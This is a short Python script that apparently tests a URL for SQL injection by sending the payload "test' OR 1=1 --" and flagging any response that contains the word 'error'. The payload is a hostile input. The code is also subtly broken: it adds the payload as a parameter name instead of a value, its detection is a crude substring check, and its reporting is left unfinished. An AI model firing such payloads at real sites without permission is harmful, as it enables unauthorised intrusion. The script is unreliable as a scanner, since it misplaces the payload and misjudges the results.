import urllib.parse
import http.client

def test_sql_injection(url, payload):
    uri = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qsl(uri.query) + [(payload, '')]
    uri = uri._replace(query=urllib.parse.urlencode(params))
    conn = http.client.HTTPSConnection(uri.netloc)
    conn.request("GET", uri.path + "?" + uri.query)
    response = conn.getresponse()

    # Analyze the response for SQL injection vulnerabilities
    if "error" in response.read().decode():
        print("SQL injection vulnerability detected")

    # Print a summary of the vulnerabilities found
    # ...
    
    conn.close()

# Example usage
test_sql_injection('https://example.com/search?q=test', "test' OR 1=1 --")
